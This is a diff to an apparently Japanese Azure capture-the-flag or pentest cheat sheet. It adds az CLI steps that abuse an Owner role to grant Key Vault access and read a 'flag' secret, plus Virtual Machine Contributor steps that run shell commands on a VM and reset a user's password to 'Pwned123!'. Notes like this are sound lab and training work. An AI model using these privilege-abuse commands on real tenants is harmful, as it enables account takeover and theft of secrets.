@@ -47,6 +47,13 @@ az vm identity show --name LinuxVM --resource-group rg-07304698 --query principa
 az role assignment list --assignee d727460b-47c8-48e9-81c0-4256e0984a31 --all -o table
 ```
 
+```sh
+# ロールに実際に付与されているPermission一覧
+az role definition list --name "Owner" -o json
+
+az role definition list --name "Virtual Machine Contributor" -o json
+```
+
 ## IMDS エンドポイント
 
 ```sh
@@ -115,7 +122,7 @@ curl -s -H "Authorization: Bearer $TOKEN" \
      "https://akv-09261155.vault.azure.net/secrets/シークレット名?api-version=7.4" | jq .
 ```
 
-### マネージドIDにロールを付与する
+## ロール
 
 ```sh
 # VMのマネージドIDのプリンシパル名を取得
@@ -126,6 +133,10 @@ az vm identity show --name LinuxVM --resource-group rg-07304698 --query principa
 # マネージドIDに付与されているロール一覧
 az role assignment list --assignee d727460b-47c8-48e9-81c0-4256e0984a31 --all -o table
 ```
+
+### Ownerロール
+
+#### マネージドIDに `Key Vault Secrets User` ロールを付与
 
 ```sh
 # マネージドIDに対してKeyVaultSecretsUserロールを付与
@@ -141,6 +152,23 @@ az keyvault secret list --vault-name akv-09275028
 az keyvault secret show --vault-name akv-09275028 --name flag
 ```
 
+### Virtual Machine Contributor ロール
+
+#### コマンド実行
+
+```sh
+az vm run-command invoke \
+  --resource-group rg-09282971 \
+  --name LinuxVM1 \
+  --command-id RunShellScript \
+  --scripts "whoami"
+```
+
+#### パスワード変更
+
+```sh
+az vm user update -u tyler -p 'Pwned123!' -n LinuxVM1 -g <rg>
+```
 
 ## Powershell
 
@@ -165,6 +193,3 @@ Get-AzKeyVault -Name akv-09275028 -ResourceGroupName rg-09275028
 # 割り当てられたロールの一覧
 Get-AzRoleAssignment
 ```
-
-
-
